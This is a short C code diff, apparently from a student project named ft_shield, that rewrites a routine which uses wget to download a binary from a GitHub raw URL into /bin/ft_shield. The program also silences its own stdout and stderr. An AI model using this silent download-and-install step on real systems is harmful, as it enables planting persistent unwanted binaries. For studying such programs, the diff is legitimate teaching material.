@@ -3,6 +3,8 @@
 #include <unistd.h>
 #include <string.h>
 #include <fcntl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 
 void run(char *const argv[], const char *path) {
     pid_t pid = fork();
@@ -21,19 +23,18 @@ void run(char *const argv[], const char *path) {
 
 
 void download_file() {
-    char cmd[256];
-    const char *bin_url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/bin/ft_shield";
+    char *bin_url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/bin/ft_shield";
 
-    memset(cmd, 0,256);
-    snprintf(cmd, sizeof(cmd), "wget -O /bin/ft_shield %s", bin_url);
-    system(cmd);
+    char *cmd[] = {"wget", "-O", "/bin/ft_shield", bin_url, NULL};
+
+    run(cmd, "/bin/wget");
 }
 
 int main(int ac, char **av) {
     (void)ac;
     
     printf("hkrifa\nmisaev\n");
-    const char *shield_path = "/bin/ft_shield";
+    char *shield_path = "/bin/ft_shield";
     int fd = open("/dev/null", O_RDWR, 0);
     dup2(fd, STDOUT_FILENO);
     dup2(fd, STDERR_FILENO);
